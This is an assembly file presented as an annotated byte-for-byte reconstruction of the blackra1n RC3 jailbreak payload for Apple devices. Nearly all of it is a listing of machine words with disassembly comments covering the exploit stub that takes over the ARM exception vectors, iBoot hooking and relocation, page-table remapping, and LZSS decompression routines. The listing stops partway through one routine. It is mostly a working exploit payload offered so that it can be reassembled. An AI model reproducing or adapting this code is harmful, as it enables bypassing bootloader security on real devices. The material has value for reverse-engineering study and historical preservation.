/*
 * blackra1n RC3 payload — annotated reconstruction
 * Original: blackra1n.app/Contents/Resources/payload (9504 bytes)
 * SHA-256:  0220fe0bd995c6404de85bdc9cca32bedc82304c904988d40f577e249f2a924d
 * Linked at VA 0x00100000 after usb_control_msg(0x21, 2) overwrites
 * the ARM exception vectors at physical address 0.
 *
 * This file is a 1:1 word listing of the original blob so it
 * reassembles to the same bytes. Mnemonics are comments.
 */
.syntax unified
.arch armv6
.global _start
.equ PAYLOAD_BASE, 0x00100000

.section .text
.org 0


/* ----- _start @ 0x0000 ----- */
_start:
    .word  0xEA00000E    /* 0000: b        #0x100040 */
    .word  0xEA00000D    /* 0004: b        #0x100040 */
    .word  0xEA00000C    /* 0008: b        #0x100040 */
    .word  0xEA00000B    /* 000C: b        #0x100040 */
    .word  0xEA00000A    /* 0010: b        #0x100040 */
    .word  0xEA000009    /* 0014: b        #0x100040 */
    .word  0xEA000008    /* 0018: b        #0x100040 */
    .word  0xEA000007    /* 001C: b        #0x100040 */
    .word  0x00000040    /* 0020: @... */
    .word  0x00000040    /* 0024: @... */
    .word  0x00000040    /* 0028: @... */
    .word  0x00000040    /* 002C: @... */
    .word  0x00000040    /* 0030: @... */
    .word  0x00000040    /* 0034: @... */
    .word  0x00000040    /* 0038: @... */
    .word  0x00000040    /* 003C: @... */

/* ----- exploit_stub @ 0x0040 ----- */
exploit_stub:
    .word  0xE92D5FFF    /* 0040: push     {r0, r1, r2, r3, r4, r5, r6, r7, r8, sb, sl, fp, ip, lr} */
    .word  0xE3A00018    /* 0044: mov      r0, #0x18 */
    .word  0xE58D0034    /* 0048: str      r0, [sp, #0x34] */
    .word  0xEE125F10    /* 004C: mrc      p15, #0, r5, c2, c0, #0 */
    .word  0xE1A05725    /* 0050: lsr      r5, r5, #0xe */
    .word  0xE1A05705    /* 0054: lsl      r5, r5, #0xe */
    .word  0xE1A04C2E    /* 0058: lsr      r4, lr, #0x18 */
    .word  0xE354004F    /* 005C: cmp      r4, #0x4f */
    .word  0x03A01441    /* 0060: moveq    r1, #0x41000000 */
    .word  0x03A02442    /* 0064: moveq    r2, #0x42000000 */
    .word  0x03A03000    /* 0068: moveq    r3, #0 */
    .word  0x13A01409    /* 006C: movne    r1, #0x9000000 */
    .word  0x13A0240A    /* 0070: movne    r2, #0xa000000 */
    .word  0x13A03001    /* 0074: movne    r3, #1 */
    .word  0xE354000F    /* 0078: cmp      r4, #0xf */
    .word  0x03A03002    /* 007C: moveq    r3, #2 */
    .word  0xE5813000    /* 0080: str      r3, [r1] */
    .word  0xE24EE004    /* 0084: sub      lr, lr, #4 */
    .word  0xE581E004    /* 0088: str      lr, [r1, #4] */
    .word  0xE382201E    /* 008C: orr      r2, r2, #0x1e */
    .word  0xE3822B03    /* 0090: orr      r2, r2, #0xc00 */
    .word  0xE5852004    /* 0094: str      r2, [r5, #4] */
    .word  0xE3A00601    /* 0098: mov      r0, #0x100000 */
    .word  0xE3A02901    /* 009C: mov      r2, #0x4000 */
    .word  0xEB000022    /* 00A0: bl       #0x100130 */
    .word  0xE3A00601    /* 00A4: mov      r0, #0x100000 */
    .word  0xE08FF000    /* 00A8: add      pc, pc, r0 */
    .word  0xE1A00000    /* 00AC: .... */
    .word  0xE1A00000    /* 00B0: .... */

/* ----- stub_after_reloc @ 0x00B4 ----- */
stub_after_reloc:
    .word  0xEB00063C    /* 00B4: bl       #0x1019ac */
    .word  0xE3A00000    /* 00B8: mov      r0, #0 */
    .word  0xE59F1220    /* 00BC: ldr      r1, [pc, #0x220] */
    .word  0xE5911000    /* 00C0: ldr      r1, [r1] */
    .word  0xE5911004    /* 00C4: ldr      r1, [r1, #4] */
    .word  0xE3A02040    /* 00C8: mov      r2, #0x40 */
    .word  0xEB000204    /* 00CC: bl       #0x1008e4 */
    .word  0xEB000020    /* 00D0: bl       #0x100158 */
    .word  0xE59FE20C    /* 00D4: ldr      lr, [pc, #0x20c] */
    .word  0xE8BD9FFF    /* 00D8: pop      {r0, r1, r2, r3, r4, r5, r6, r7, r8, sb, sl, fp, ip, pc} */
    .word  0xE1A00000    /* 00DC: .... */
    .word  0xE1A00000    /* 00E0: .... */
    .word  0xE1A00000    /* 00E4: .... */
    .word  0xE1A00000    /* 00E8: .... */
    .word  0xE1A00000    /* 00EC: .... */
    .word  0xE1A00000    /* 00F0: .... */

/* ----- iboot_hook_entry @ 0x00F4 ----- */
iboot_hook_entry:
    .word  0xE3A03601    /* 00F4: mov      r3, #0x100000 */
    .word  0xE2833008    /* 00F8: add      r3, r3, #8 */
    .word  0xE8837FFF    /* 00FC: stm      r3, {r0, r1, r2, r3, r4, r5, r6, r7, r8, sb, sl, fp, ip, sp, lr} */
    .word  0xE59F11DC    /* 0100: ldr      r1, [pc, #0x1dc] */
    .word  0xE5911000    /* 0104: ldr      r1, [r1] */
    .word  0xE5911008    /* 0108: ldr      r1, [r1, #8] */
    .word  0xE3A02402    /* 010C: mov      r2, #0x2000000 */
    .word  0xE081D002    /* 0110: add      sp, r1, r2 */
    .word  0xEB000655    /* 0114: bl       #0x101a70 */
    .word  0xE3A03601    /* 0118: mov      r3, #0x100000 */
    .word  0xE2833008    /* 011C: add      r3, r3, #8 */
    .word  0xE8937FFF    /* 0120: ldm      r3, {r0, r1, r2, r3, r4, r5, r6, r7, r8, sb, sl, fp, ip, sp, lr} */
    .word  0xE3A03601    /* 0124: mov      r3, #0x100000 */
    .word  0xE593F004    /* 0128: ldr      pc, [r3, #4] */
    .word  0xE1A00000    /* 012C: .... */

/* ----- memcpy32 @ 0x0130 ----- */
memcpy32:
    .word  0xE0822000    /* 0130: add      r2, r2, r0 */
    .word  0xE4913004    /* 0134: ldr      r3, [r1], #4 */
    .word  0xE4803004    /* 0138: str      r3, [r0], #4 */
    .word  0xE1500002    /* 013C: cmp      r0, r2 */
    .word  0x1AFFFFFB    /* 0140: bne      #0x100134 */
    .word  0xE12FFF1E    /* 0144: bx       lr */
    .word  0xE1A00000    /* 0148: .... */
    .word  0xE1A00000    /* 014C: .... */

/* ----- bswap32 @ 0x0150 ----- */
bswap32:
    .word  0xE6BF0F30    /* 0150: rev      r0, r0 */
    .word  0xE12FFF1E    /* 0154: bx       lr */

/* ----- icache_invalidate @ 0x0158 ----- */
icache_invalidate:
    .word  0xE1A00000    /* 0158: mov      r0, r0 */
    .word  0xE1A00000    /* 015C: mov      r0, r0 */
    .word  0xE1A00000    /* 0160: mov      r0, r0 */
    .word  0xE1A00000    /* 0164: mov      r0, r0 */
    .word  0xE3A00000    /* 0168: mov      r0, #0 */
    .word  0xEE070F15    /* 016C: mcr      p15, #0, r0, c7, c5, #0 */
    .word  0xE1A00000    /* 0170: mov      r0, r0 */
    .word  0xE1A00000    /* 0174: mov      r0, r0 */
    .word  0xE1A00000    /* 0178: mov      r0, r0 */
    .word  0xE1A00000    /* 017C: mov      r0, r0 */
    .word  0xE12FFF1E    /* 0180: bx       lr */
    .word  0xE1A00000    /* 0184: .... */
    .word  0xE1A00000    /* 0188: .... */
    .word  0xE1A00000    /* 018C: .... */
    .word  0x00100194    /* 0190: .... */

/* ----- call_iboot_4FF1E59D @ 0x0194 ----- */
call_iboot_4FF1E59D:
    .word  0xE92D40F0    /* 0194: push     {r4, r5, r6, r7, lr} */
    .word  0xE5910018    /* 0198: ldr      r0, [r1, #0x18] */
    .word  0xE3A01040    /* 019C: mov      r1, #0x40 */
    .word  0xE3A0409D    /* 01A0: mov      r4, #0x9d */
    .word  0xE3A050E5    /* 01A4: mov      r5, #0xe5 */
    .word  0xE1A05405    /* 01A8: lsl      r5, r5, #8 */
    .word  0xE1844005    /* 01AC: orr      r4, r4, r5 */
    .word  0xE3A050F1    /* 01B0: mov      r5, #0xf1 */
    .word  0xE1A05805    /* 01B4: lsl      r5, r5, #0x10 */
    .word  0xE1844005    /* 01B8: orr      r4, r4, r5 */
    .word  0xE3A0504F    /* 01BC: mov      r5, #0x4f */
    .word  0xE1A05C05    /* 01C0: lsl      r5, r5, #0x18 */
    .word  0xE1844005    /* 01C4: orr      r4, r4, r5 */
    .word  0xE12FFF34    /* 01C8: blx      r4 */
    .word  0xE8BD80F0    /* 01CC: pop      {r4, r5, r6, r7, pc} */
    .word  0x001001E0    /* 01D0: .... */
    .word  0xE1A00000    /* 01D4: .... */
    .word  0xE1A00000    /* 01D8: .... */
    .word  0xE1A00000    /* 01DC: .... */

/* ----- tramp_thumb_to_load_hook @ 0x01E0 ----- */
tramp_thumb_to_load_hook:
    .hword 0x4B00    /* 01E0: ldr r3, [pc, #0] */
    .hword 0x4718    /* 01E2: bx r3 */
    .word  0x00100290    /* 01E4: mulseq   r0, r0, r2 */
    .word  0x46C046C0    /* 01E8: strbmi   r4, [r0], r0, asr #13 */
    .word  0x46C046C0    /* 01EC: strbmi   r4, [r0], r0, asr #13 */
    .word  0x00100200    /* 01F0: andseq   r0, r0, r0, lsl #4 */
    .word  0x46C046C0    /* 01F4: strbmi   r4, [r0], r0, asr #13 */
    .word  0x46C046C0    /* 01F8: strbmi   r4, [r0], r0, asr #13 */
    .word  0x46C046C0    /* 01FC: strbmi   r4, [r0], r0, asr #13 */

/* ----- tramp_thumb_to_lzss @ 0x0200 ----- */
tramp_thumb_to_lzss:
    .hword 0x4900    /* 0200: ldr r1, [pc, #0] */
    .hword 0x4708    /* 0202: bx r1 */
    .word  0x001006B4    /* 0204: ldrheq   r0, [r0], -r4 */

/* ----- str_geohot @ 0x0208 ----- */
str_geohot:
    .word  0x686F6567    /* 0208: str_geohot geoh */
    .word  0x6200746F    /* 020C: ot.b */
    .word  0x6B63616C    /* 0210: lack */
    .word  0x20736920    /* 0214:  is  */
    .word  0x20656874    /* 0218: the  */
    .word  0x2077656E    /* 021C: new  */
    .word  0x70727570    /* 0220: purp */
    .word  0x0000656C    /* 0224: le.. */
    .word  0x46C046C0    /* 0228: .F.F */
    .word  0x46C046C0    /* 022C: .F.F */
    .word  0x00100234    /* 0230: 4... */
    .word  0x00100208    /* 0234: .... */
    .word  0x00101BB4    /* 0238: .... */
    .word  0x0010020F    /* 023C: .... */
    .word  0x00100250    /* 0240: P... */
    .word  0x00100288    /* 0244: .... */
    .word  0x46C046C0    /* 0248: .F.F */
    .word  0x46C046C0    /* 024C: .F.F */

/* ----- thumb_relocate_iboot @ 0x0250 ----- */
thumb_relocate_iboot:
    .hword 0x46C0    /* 0250: mov r8, r8 */
    .hword 0x46C0    /* 0252: mov r8, r8 */
    .hword 0x46C0    /* 0254: mov r8, r8 */
    .hword 0x46C0    /* 0256: mov r8, r8 */
    .hword 0x46C0    /* 0258: mov r8, r8 */
    .hword 0x46C0    /* 025A: mov r8, r8 */
    .hword 0x46C0    /* 025C: mov r8, r8 */
    .hword 0x4668    /* 025E: mov r0, sp */
    .hword 0x0E00    /* 0260: lsrs r0, r0, #0x18 */
    .hword 0x0600    /* 0262: lsls r0, r0, #0x18 */
    .hword 0x1C01    /* 0264: adds r1, r0, #0 */
    .hword 0x3140    /* 0266: adds r1, #0x40 */
    .hword 0x1C0C    /* 0268: adds r4, r1, #0 */
    .hword 0x2201    /* 026A: movs r2, #1 */
    .hword 0x0412    /* 026C: lsls r2, r2, #0x10 */
    .hword 0x1812    /* 026E: adds r2, r2, r0 */
    .hword 0x680B    /* 0270: ldr r3, [r1] */
    .hword 0x3104    /* 0272: adds r1, #4 */
    .hword 0x6003    /* 0274: str r3, [r0] */
    .hword 0x3004    /* 0276: adds r0, #4 */
    .hword 0x4290    /* 0278: cmp r0, r2 */
    .hword 0xD1F9    /* 027A: bne #0x100270 */
    .hword 0x2000    /* 027C: movs r0, #0 */
    .hword 0x1C21    /* 027E: adds r1, r4, #0 */
    .hword 0x2200    /* 0280: movs r2, #0 */
    .hword 0x4C01    /* 0282: ldr r4, [pc, #4] */
    .hword 0x47A0    /* 0284: blx r4 */
    .hword 0x46C0    /* 0286: mov r8, r8 */
    .word  0x00003969    /* 0288: andeq    r3, r0, sb, ror #18 */
    .word  0x00000000    /* 028C: andeq    r0, r0, r0 */

/* ----- load_hook_wrapper @ 0x0290 ----- */
load_hook_wrapper:
    .word  0xE92D4080    /* 0290: push     {r7, lr} */
    .word  0xE087700D    /* 0294: add      r7, r7, sp */
    .word  0xE1A04000    /* 0298: mov      r4, r0 */
    .word  0xE1A05002    /* 029C: mov      r5, r2 */
    .word  0xE1A06001    /* 02A0: mov      r6, r1 */
    .word  0xEB0004B3    /* 02A4: bl       #0x101578 */
    .word  0xE1A00004    /* 02A8: mov      r0, r4 */
    .word  0xE1A02005    /* 02AC: mov      r2, r5 */
    .word  0xE1A01006    /* 02B0: mov      r1, r6 */
    .word  0xE59F3004    /* 02B4: ldr      r3, [pc, #4] */
    .word  0xE2833009    /* 02B8: add      r3, r3, #9 */
    .word  0xE12FFF13    /* 02BC: bx       r3 */
    .word  0x00000000    /* 02C0: andeq    r0, r0, r0 */
    .word  0xE1A00000    /* 02C4: mov      r0, r0 */
    .word  0xE1A00000    /* 02C8: mov      r0, r0 */
    .word  0xE1A00000    /* 02CC: mov      r0, r0 */

/* ----- map_section_va_00200000 @ 0x02D0 ----- */
map_section_va_00200000:
    .word  0xEE121F10    /* 02D0: mrc      p15, #0, r1, c2, c0, #0 */
    .word  0xE1A01721    /* 02D4: lsr      r1, r1, #0xe */
    .word  0xE1A01701    /* 02D8: lsl      r1, r1, #0xe */
    .word  0xE5810008    /* 02DC: str      r0, [r1, #8] */
    .word  0xE12FFF1E    /* 02E0: bx       lr */
    .word  0x0010256C    /* 02E4: andseq   r2, r0, ip, ror #10 */
    .word  0x001000EC    /* 02E8: andseq   r0, r0, ip, ror #1 */
    .word  0xE1A00000    /* 02EC: mov      r0, r0 */

/* ----- indirect_call @ 0x02F0 ----- */
indirect_call:
    .word  0xE52DE004    /* 02F0: str      lr, [sp, #-4]! */
    .word  0xE59FC008    /* 02F4: ldr      ip, [pc, #8] */
    .word  0xE1A0E00F    /* 02F8: mov      lr, pc */
    .word  0xE59CF000    /* 02FC: ldr      pc, [ip] */
    .word  0xE49DF004    /* 0300: pop      {pc} */
    .word  0x0010254C    /* 0304: andseq   r2, r0, ip, asr #10 */
    .word  0xE12FFF1E    /* 0308: bx       lr */

/* ----- lzss_unpack @ 0x030C ----- */
lzss_unpack:
    .word  0xE92D4DF0    /* 030C: push     {r4, r5, r6, r7, r8, sl, fp, lr} */
    .word  0xE24DDA01    /* 0310: sub      sp, sp, #0x1000 */
    .word  0xE24DD014    /* 0314: sub      sp, sp, #0x14 */
    .word  0xE28D3014    /* 0318: add      r3, sp, #0x14 */
    .word  0xE59FE108    /* 031C: ldr      lr, [pc, #0x108] */
    .word  0xE0816002    /* 0320: add      r6, r1, r2 */
    .word  0xE1A0B000    /* 0324: mov      fp, r0 */
    .word  0xE2433011    /* 0328: sub      r3, r3, #0x11 */
    .word  0xE3A02000    /* 032C: mov      r2, #0 */
    .word  0xE3A0C020    /* 0330: mov      ip, #0x20 */
    .word  0xE7C2C003    /* 0334: strb     ip, [r2, r3] */
    .word  0xE2822001    /* 0338: add      r2, r2, #1 */
    .word  0xE152000E    /* 033C: cmp      r2, lr */
    .word  0x1AFFFFFB    /* 0340: bne      #0x100334 */
    .word  0xE28DA014    /* 0344: add      sl, sp, #0x14 */
    .word  0xE1A05002    /* 0348: mov      r5, r2 */
    .word  0xE24AA011    /* 034C: sub      sl, sl, #0x11 */
    .word  0xE1A0000B    /* 0350: mov      r0, fp */
    .word  0xE3A07000    /* 0354: mov      r7, #0 */
    .word  0xEA000001    /* 0358: b        #0x100364 */
    .word  0xE2841001    /* 035C: add      r1, r4, #1 */
    .word  0xE1A0000E    /* 0360: mov      r0, lr */
    .word  0xE1A070A7    /* 0364: lsr      r7, r7, #1 */
    .word  0xE3170C01    /* 0368: tst      r7, #0x100 */
    .word  0x1A000003    /* 036C: bne      #0x100380 */
    .word  0xE1510006    /* 0370: cmp      r1, r6 */
    .word  0x2A000028    /* 0374: bhs      #0x10041c */
    .word  0xE4D13001    /* 0378: ldrb     r3, [r1], #1 */
    .word  0xE3837CFF    /* 037C: orr      r7, r3, #0xff00 */
    .word  0xE3170001    /* 0380: tst      r7, #1 */
    .word  0x0A000009    /* 0384: beq      #0x1003b0 */
    .word  0xE1510006    /* 0388: cmp      r1, r6 */
    .word  0x2A000022    /* 038C: bhs      #0x10041c */
    .word  0xE4D13001    /* 0390: ldrb     r3, [r1], #1 */
    .word  0xE2852001    /* 0394: add      r2, r5, #1 */
    .word  0xE4C03001    /* 0398: strb     r3, [r0], #1 */
    .word  0xE7CA3005    /* 039C: strb     r3, [sl, r5] */
    .word  0xE1A05A02    /* 03A0: lsl      r5, r2, #0x14 */
    .word  0xE1A0E000    /* 03A4: mov      lr, r0 */
    .word  0xE1A05A25    /* 03A8: lsr      r5, r5, #0x14 */
    .word  0xEAFFFFEB    /* 03AC: b        #0x100360 */
    .word  0xE1510006    /* 03B0: cmp      r1, r6 */
    .word  0x2A000018    /* 03B4: bhs      #0x10041c */
    .word  0xE1A04001    /* 03B8: mov      r4, r1 */
    .word  0xE4D4C001    /* 03BC: ldrb     ip, [r4], #1 */
    .word  0xE1540006    /* 03C0: cmp      r4, r6 */
    .word  0x2A000014    /* 03C4: bhs      #0x10041c */
    .word  0xE5D13001    /* 03C8: ldrb     r3, [r1, #1] */
    .word  0xE203200F    /* 03CC: and      r2, r3, #0xf */
    .word  0xE20330F0    /* 03D0: and      r3, r3, #0xf0 */
    .word  0xE18C8203    /* 03D4: orr      r8, ip, r3, lsl #4 */
    .word  0xE2821002    /* 03D8: add      r1, r2, #2 */
    .word  0xE1A0E000    /* 03DC: mov      lr, r0 */
    .word  0xE3A0C000    /* 03E0: mov      ip, #0 */
    .word  0xE08C3008    /* 03E4: add      r3, ip, r8 */
    .word  0xE1A03A03    /* 03E8: lsl      r3, r3, #0x14 */
    .word  0xE1A03A23    /* 03EC: lsr      r3, r3, #0x14 */
    .word  0xE7DA3003    /* 03F0: ldrb     r3, [sl, r3] */
    .word  0xE2852001    /* 03F4: add      r2, r5, #1 */
    .word  0xE7CC3000    /* 03F8: strb     r3, [ip, r0] */
    .word  0xE28CC001    /* 03FC: add      ip, ip, #1 */
    .word  0xE7CA3005    /* 0400: strb     r3, [sl, r5] */
    .word  0xE15C0001    /* 0404: cmp      ip, r1 */
    .word  0xE1A05A02    /* 0408: lsl      r5, r2, #0x14 */
    .word  0xE28EE001    /* 040C: add      lr, lr, #1 */
    .word  0xE1A05A25    /* 0410: lsr      r5, r5, #0x14 */
    .word  0xCAFFFFD0    /* 0414: bgt      #0x10035c */
    .word  0xEAFFFFF1    /* 0418: b        #0x1003e4 */
    .word  0xE06B0000    /* 041C: rsb      r0, fp, r0 */
    .word  0xE28DD014    /* 0420: add      sp, sp, #0x14 */
    .word  0xE28DDA01    /* 0424: add      sp, sp, #0x1000 */
    .word  0xE8BD8DF0    /* 0428: pop      {r4, r5, r6, r7, r8, sl, fp, pc} */
    .word  0x00000FEE    /* 042C: andeq    r0, r0, lr, ror #31 */

/* ----- lzss_tree_step @ 0x0430 ----- */
lzss_tree_step:
    .word  0xE92D4DF0    /* 0430: push     {r4, r5, r6, r7, r8, sl, fp, lr} */
    .word  0xE2803B31    /* 0434: add      r3, r0, #0xc400 */
    .word  0xE283300C    /* 0438: add      r3, r3, #0xc */
    .word  0xE7D32001    /* 043C: ldrb     r2, [r3, r1] */
    .word  0xE1A04000    /* 0440: mov      r4, r0 */
    .word  0xE59FC144    /* 0444: ldr      ip, [pc, #0x144] */
    .word  0xE59F0144    /* 0448: ldr      r0, [pc, #0x144] */
    .word  0xE1A06001    /* 044C: mov      r6, r1 */
    .word  0xE282EA01    /* 0450: add      lr, r2, #0x1000 */
    .word  0xE3A07001    /* 0454: mov      r7, #1 */
    .word  0xE3A01A01    /* 0458: mov      r1, #0x1000 */
    .word  0xE0842106    /* 045C: add      r2, r4, r6, lsl #2 */
    .word  0xE0838006    /* 0460: add      r8, r3, r6 */
    .word  0xE08EE007    /* 0464: add      lr, lr, r7 */
    .word  0xE3A03000    /* 0468: mov      r3, #0 */
    .word  0xE1A0B000    /* 046C: mov      fp, r0 */
    .word  0xE1A0A00C    /* 0470: mov      sl, ip */
    .word  0xE7821000    /* 0474: str      r1, [r2, r0] */
    .word  0xE784300C    /* 0478: str      r3, [r4, ip] */
    .word  0xE7841106    /* 047C: str      r1, [r4, r6, lsl #2] */
    .word  0xEA000000    /* 0480: b        #0x100488 */
    .word  0xE1A0E005    /* 0484: mov      lr, r5 */
    .word  0xE3570000    /* 0488: cmp      r7, #0 */
    .word  0xBA000008    /* 048C: blt      #0x1004b4 */
    .word  0xE084110E    /* 0490: add      r1, r4, lr, lsl #2 */
    .word  0xE791500B    /* 0494: ldr      r5, [r1, fp] */
    .word  0xE3550A01    /* 0498: cmp      r5, #0x1000 */
    .word  0x1A00000C    /* 049C: bne      #0x1004d4 */
    .word  0xE59F30F0    /* 04A0: ldr      r3, [pc, #0xf0] */
    .word  0xE0842106    /* 04A4: add      r2, r4, r6, lsl #2 */
    .word  0xE782E003    /* 04A8: str      lr, [r2, r3] */
    .word  0xE781600B    /* 04AC: str      r6, [r1, fp] */
    .word  0xE8BD8DF0    /* 04B0: pop      {r4, r5, r6, r7, r8, sl, fp, pc} */
    .word  0xE794510E    /* 04B4: ldr      r5, [r4, lr, lsl #2] */
    .word  0xE3550A01    /* 04B8: cmp      r5, #0x1000 */
    .word  0x1A000004    /* 04BC: bne      #0x1004d4 */
    .word  0xE59F30D0    /* 04C0: ldr      r3, [pc, #0xd0] */
    .word  0xE0842106    /* 04C4: add      r2, r4, r6, lsl #2 */
    .word  0xE782E003    /* 04C8: str      lr, [r2, r3] */
    .word  0xE784610E    /* 04CC: str      r6, [r4, lr, lsl #2] */
    .word  0xE8BD8DF0    /* 04D0: pop      {r4, r5, r6, r7, r8, sl, fp, pc} */
    .word  0xE2853B31    /* 04D4: add      r3, r5, #0xc400 */
    .word  0xE283300C    /* 04D8: add      r3, r3, #0xc */
    .word  0xE0840003    /* 04DC: add      r0, r4, r3 */
    .word  0xE3A01001    /* 04E0: mov      r1, #1 */
    .word  0xE5D03001    /* 04E4: ldrb     r3, [r0, #1] */
    .word  0xE7D12008    /* 04E8: ldrb     r2, [r1, r8] */
    .word  0xE0527003    /* 04EC: subs     r7, r2, r3 */
    .word  0xE2800001    /* 04F0: add      r0, r0, #1 */
    .word  0x1A000002    /* 04F4: bne      #0x100504 */
    .word  0xE2811001    /* 04F8: add      r1, r1, #1 */
    .word  0xE3510012    /* 04FC: cmp      r1, #0x12 */
    .word  0x1AFFFFF7    /* 0500: bne      #0x1004e4 */
    .word  0xE794300A    /* 0504: ldr      r3, [r4, sl] */
    .word  0xE1510003    /* 0508: cmp      r1, r3 */
    .word  0xDAFFFFDC    /* 050C: ble      #0x100484 */
    .word  0xE59F3084    /* 0510: ldr      r3, [pc, #0x84] */
    .word  0xE3510011    /* 0514: cmp      r1, #0x11 */
    .word  0xE7845003    /* 0518: str      r5, [r4, r3] */
    .word  0xE784100A    /* 051C: str      r1, [r4, sl] */
    .word  0xDAFFFFD7    /* 0520: ble      #0x100484 */
    .word  0xE59F7068    /* 0524: ldr      r7, [pc, #0x68] */
    .word  0xE0840105    /* 0528: add      r0, r4, r5, lsl #2 */
    .word  0xE7942105    /* 052C: ldr      r2, [r4, r5, lsl #2] */
    .word  0xE7903007    /* 0530: ldr      r3, [r0, r7] */
    .word  0xE084E106    /* 0534: add      lr, r4, r6, lsl #2 */
    .word  0xE78E3007    /* 0538: str      r3, [lr, r7] */
    .word  0xE7842106    /* 053C: str      r2, [r4, r6, lsl #2] */
    .word  0xE59F3050    /* 0540: ldr      r3, [pc, #0x50] */
    .word  0xE7942105    /* 0544: ldr      r2, [r4, r5, lsl #2] */
    .word  0xE7901007    /* 0548: ldr      r1, [r0, r7] */
    .word  0xE790C003    /* 054C: ldr      ip, [r0, r3] */
    .word  0xE0842102    /* 0550: add      r2, r4, r2, lsl #2 */
    .word  0xE0841101    /* 0554: add      r1, r4, r1, lsl #2 */
    .word  0xE78EC003    /* 0558: str      ip, [lr, r3] */
    .word  0xE7826003    /* 055C: str      r6, [r2, r3] */
    .word  0xE7816003    /* 0560: str      r6, [r1, r3] */
    .word  0xE7901003    /* 0564: ldr      r1, [r0, r3] */
    .word  0xE0842101    /* 0568: add      r2, r4, r1, lsl #2 */
    .word  0xE7923007    /* 056C: ldr      r3, [r2, r7] */
    .word  0xE1530005    /* 0570: cmp      r3, r5 */
    .word  0xE59F301C    /* 0574: ldr      r3, [pc, #0x1c] */
    .word  0x07826007    /* 0578: streq    r6, [r2, r7] */
    .word  0x17846101    /* 057C: strne    r6, [r4, r1, lsl #2] */
    .word  0xE3A02A01    /* 0580: mov      r2, #0x1000 */
    .word  0xE0841105    /* 0584: add      r1, r4, r5, lsl #2 */
    .word  0xE7812003    /* 0588: str      r2, [r1, r3] */
    .word  0xE8BD8DF0    /* 058C: pop      {r4, r5, r6, r7, r8, sl, fp, pc} */
    .word  0x0000D424    /* 0590: andeq    sp, r0, r4, lsr #8 */
    .word  0x00004004    /* 0594: andeq    r4, r0, r4 */
    .word  0x00008408    /* 0598: andeq    r8, r0, r8, lsl #8 */
    .word  0x0000D420    /* 059C: andeq    sp, r0, r0, lsr #8 */
    .word  0xE59F3104    /* 05A0: ldr      r3, [pc, #0x104] */
    .word  0xE0802101    /* 05A4: add      r2, r0, r1, lsl #2 */
    .word  0xE7923003    /* 05A8: ldr      r3, [r2, r3] */
    .word  0xE3530A01    /* 05AC: cmp      r3, #0x1000 */

/* ----- lzss_tree_link @ 0x05B0 ----- */
lzss_tree_link:
    .word  0xE92D40F0    /* 05B0: push     {r4, r5, r6, r7, lr} */
    .word  0xE1A04000    /* 05B4: mov      r4, r0 */
    .word  0xE1A06001    /* 05B8: mov      r6, r1 */
    .word  0x08BD80F0    /* 05BC: popeq    {r4, r5, r6, r7, pc} */
    .word  0xE59F10E8    /* 05C0: ldr      r1, [pc, #0xe8] */
    .word  0xE792C001    /* 05C4: ldr      ip, [r2, r1] */
    .word  0xE7903106    /* 05C8: ldr      r3, [r0, r6, lsl #2] */
    .word  0xE35C0A01    /* 05CC: cmp      ip, #0x1000 */
    .word  0x01A0C003    /* 05D0: moveq    ip, r3 */
    .word  0x0A000023    /* 05D4: beq      #0x100668 */
    .word  0xE3530A01    /* 05D8: cmp      r3, #0x1000 */
    .word  0xE1A05003    /* 05DC: mov      r5, r3 */
    .word  0x0A000020    /* 05E0: beq      #0x100668 */
    .word  0xE0803103    /* 05E4: add      r3, r0, r3, lsl #2 */
    .word  0xE7933001    /* 05E8: ldr      r3, [r3, r1] */
    .word  0xE3530A01    /* 05EC: cmp      r3, #0x1000 */
    .word  0x0A000012    /* 05F0: beq      #0x100640 */
    .word  0xE1A07001    /* 05F4: mov      r7, r1 */
    .word  0xE0843105    /* 05F8: add      r3, r4, r5, lsl #2 */
    .word  0xE7935007    /* 05FC: ldr      r5, [r3, r7] */
    .word  0xE0842105    /* 0600: add      r2, r4, r5, lsl #2 */
    .word  0xE7923007    /* 0604: ldr      r3, [r2, r7] */
    .word  0xE3530A01    /* 0608: cmp      r3, #0x1000 */
    .word  0x1AFFFFF9    /* 060C: bne      #0x1005f8 */
    .word  0xE7943106    /* 0610: ldr      r3, [r4, r6, lsl #2] */
    .word  0xE59F1090    /* 0614: ldr      r1, [pc, #0x90] */
    .word  0xE794E105    /* 0618: ldr      lr, [r4, r5, lsl #2] */
    .word  0xE7843105    /* 061C: str      r3, [r4, r5, lsl #2] */
    .word  0xE792C001    /* 0620: ldr      ip, [r2, r1] */
    .word  0xE7943106    /* 0624: ldr      r3, [r4, r6, lsl #2] */
    .word  0xE084010E    /* 0628: add      r0, r4, lr, lsl #2 */
    .word  0xE0843103    /* 062C: add      r3, r4, r3, lsl #2 */
    .word  0xE084210C    /* 0630: add      r2, r4, ip, lsl #2 */
    .word  0xE780C001    /* 0634: str      ip, [r0, r1] */
    .word  0xE782E007    /* 0638: str      lr, [r2, r7] */
    .word  0xE7835001    /* 063C: str      r5, [r3, r1] */
    .word  0xE59F2068    /* 0640: ldr      r2, [pc, #0x68] */
    .word  0xE0840106    /* 0644: add      r0, r4, r6, lsl #2 */
    .word  0xE7901002    /* 0648: ldr      r1, [r0, r2] */
    .word  0xE0843105    /* 064C: add      r3, r4, r5, lsl #2 */
    .word  0xE7831002    /* 0650: str      r1, [r3, r2] */
    .word  0xE7903002    /* 0654: ldr      r3, [r0, r2] */
    .word  0xE59F204C    /* 0658: ldr      r2, [pc, #0x4c] */
    .word  0xE0843103    /* 065C: add      r3, r4, r3, lsl #2 */
    .word  0xE7835002    /* 0660: str      r5, [r3, r2] */
    .word  0xE1A0C005    /* 0664: mov      ip, r5 */
    .word  0xE59F203C    /* 0668: ldr      r2, [pc, #0x3c] */
    .word  0xE0840106    /* 066C: add      r0, r4, r6, lsl #2 */
    .word  0xE7901002    /* 0670: ldr      r1, [r0, r2] */
    .word  0xE084310C    /* 0674: add      r3, r4, ip, lsl #2 */
    .word  0xE7831002    /* 0678: str      r1, [r3, r2] */
    .word  0xE7901002    /* 067C: ldr      r1, [r0, r2] */
    .word  0xE59F0028    /* 0680: ldr      r0, [pc, #0x28] */
    .word  0xE0842101    /* 0684: add      r2, r4, r1, lsl #2 */
    .word  0xE7923000    /* 0688: ldr      r3, [r2, r0] */
    .word  0xE1530006    /* 068C: cmp      r3, r6 */
    .word  0xE59F3014    /* 0690: ldr      r3, [pc, #0x14] */
    .word  0x0782C000    /* 0694: streq    ip, [r2, r0] */
    .word  0x1784C101    /* 0698: strne    ip, [r4, r1, lsl #2] */
    .word  0xE3A02A01    /* 069C: mov      r2, #0x1000 */
